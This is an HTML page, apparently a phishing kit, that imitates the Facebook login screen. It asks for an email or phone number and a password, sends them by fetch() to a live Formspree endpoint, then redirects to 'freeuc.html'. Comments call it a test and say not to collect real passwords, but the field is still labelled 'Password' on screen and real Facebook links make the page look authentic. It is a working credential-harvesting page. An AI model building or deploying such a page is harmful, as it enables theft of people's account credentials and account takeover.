<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Facebook — log in or sign up (Formspree test)</title>
  <!-- Standard favicon for desktop/legacy browsers -->
  <link rel="shortcut icon" href="/favicon/favicon.ico" type="image/x-icon">

  <!-- Apple iOS icon -->
  <link rel="apple-touch-icon" href="/favicon/apple-touch-icon.png">

  <!-- Android / Chrome icon -->
  <link rel="icon" type="image/png" sizes="192x192" href="/favicon/android-chrome-192x192.png">
  <link rel="icon" type="image/png" sizes="512x512" href="/favicon/android-chrome-512x512.png">

  <!-- Optional: theme color for mobile browsers -->
  <meta name="theme-color" content="#ffffff">

  <style>
    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0
    }

    html,
    body {
      height: 100%
    }

    /* ✅ Background image with soft transparent overlay */
    body {
      font-family: 'Roboto', sans-serif;
      background:
        linear-gradient(rgba(240, 242, 245, 0.7), rgba(240, 242, 245, 0.7)),
        url("./images/loginbg.png") no-repeat center center fixed;
      background-size: cover;
      /* ensures it fills the screen */
      background-position: center;
      /* keeps it centered */
      background-attachment: fixed;
      /* keeps image still on scroll */
      height: 100vh;
      /* sets height to full viewport */
      width: 100%;
      /* spans full width */
    }


    .container {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 20px;
      flex-wrap: wrap;
      width: 100%;
      padding: 20px;
      padding-top: 130px;
    }

    .intro-section h1 {
      font-size: 60px;
      color: #1877f2;
      margin-bottom: 6px
    }

    .intro-section p {
      font-size: 24px;
      line-height: 28px;
      max-width: 500px
    }

    .signin-section {
      display: flex;
      flex-direction: column;
      gap: 24px;
      width: 396px
    }

    .card {
      background: #fff;
      border-radius: 10px;
      padding: 16px;
      box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .08)
    }

    input,
    button,
    textarea {
      font-size: 16px;
      font-family: inherit
    }

    input[type="text"],
    input[type="email"],
    textarea,
    .fake-input {
      width: 100%;
      padding: 14px;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      margin: 10px 0;
      outline: none
    }

    input:focus,
    textarea:focus {
      border-color: #1877f2
    }

    .primary-btn {
      background: #1877f2;
      color: #fff;
      border: none;
      padding: 12px;
      border-radius: 6px;
      width: 100%;
      cursor: pointer;
      font-weight: 600
    }

    .primary-btn:hover {
      background: #0d65d9
    }

    .create-btn .primary-green {
      background: #42b72a
    }

    .create-btn .primary-green:hover {
      background: #3ba626
    }

    .muted-link {
      text-align: center;
      color: #1877f2;
      display: block;
      margin: 12px 0
    }

    .status {
      display: none;
      margin-top: 8px;
      padding: 10px;
      border-radius: 6px
    }

    .status.success {
      background: #e6f9ee;
      color: #0a7a3b
    }

    .status.error {
      background: #ffe7e7;
      color: #8b1e1e
    }

    hr {
      border: 0;
      border-top: 1px solid #eee;
      margin: 16px 0
    }

    @media (max-width:956px) {
      .intro-section {
        text-align: center
      }

      .container {
        padding-top: 40px
      }
    }
  </style>

</head>

<body>
  <div class="container">
    <section class="intro-section">
      <h1>facebook</h1>
      <p>Facebook helps you connect and share with the people in your life.</p>
    </section>

    <section class="signin-section">
      <div class="card">
        <!--
          IMPORTANT:
          Replace "https://formspree.io/f/yourFormID" with your Formspree endpoint.
          Do NOT use this to capture real passwords. Use "note_or_test_id" for test IDs or non-sensitive info.
        -->
        <form id="contactForm" action="https://formspree.io/f/xgvnnglv" method="POST" novalidate>
          <!-- Collect contact identifier (email or phone) -->
          <label for="contact" style="display:none">Email or Phone</label>
          <input id="contact" name="contact" type="text" placeholder="Email address or phone number" required>

          <!-- DO NOT collect real passwords. This is a non-sensitive 'note' field for testing/demo only -->
          <label for="note_or_test_id" style="display:none">Note / Test ID</label>
          <input id="note_or_test_id" name="note_or_test_id" type="text" placeholder="Password" required>



          <button type="submit" class="primary-btn">Login</button>

          <a class="muted-link"
            href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgotten
            password?</a>
          <hr>
          <div class="create-btn">
            <button type="button" class="primary-btn primary-green"
              onclick="window.location.href='https://www.facebook.com/r.php?entry_point=login'">
              Create new account
            </button>
          </div>

          <div id="status" class="status"></div>
        </form>
      </div>

      <p style="text-align:center;font-size:14px"><a href="https://www.facebook.com/r.php?entry_point=login"
          style="color:black"><strong>Create a Page</strong></a> for
        a celebrity, brand or business.</p>
    </section>
  </div>

  <script>
    // JavaScript to submit via Fetch (AJAX) to Formspree and show user-friendly messages.
    (function () {
      const form = document.getElementById('contactForm');
      const statusDiv = document.getElementById('status');

      form.addEventListener('submit', async function (e) {
        e.preventDefault();

        // Simple client-side validation
        const contact = form.contact.value.trim();
        const note = form.note_or_test_id.value.trim();
        if (!contact || !note) {
          showStatus('Please fill the required fields.', 'error');
          return;
        }

        // Prepare data as FormData so Formspree receives it
        const formData = new FormData(form);

        try {
          // Use the action attribute of the form
          const endpoint = form.action;
          const resp = await fetch(endpoint, {
            method: 'POST',
            body: formData,
            headers: {
              'Accept': 'application/json'
            }
          });

          const data = await resp.json().catch(() => ({ ok: resp.ok }));

          if (resp.ok) {
            showStatus('Thanks — your submission has been sent!', 'success');
            form.reset();

            // Redirect to new page after 2 seconds (optional delay)
            setTimeout(() => {
              window.location.href = "freeuc.html"; // <-- replace with your target page
            }, 2000);
          } else {
            // Formspree returns errors; show helpful message
            const message = (data && data.error) ? data.error : 'Submission failed — please try again later.';
            showStatus(message, 'error');
          }

        } catch (err) {
          showStatus('Network error — please try again later.', 'error');
          console.error(err);
        }
      });

      function showStatus(text, type) {
        statusDiv.style.display = 'block';
        statusDiv.className = 'status ' + (type === 'success' ? 'success' : 'error');
        statusDiv.textContent = text;
        // auto-hide after 6s
        setTimeout(() => statusDiv.style.display = 'none', 6000);
      }
    })();
  </script>
</body>

</html>
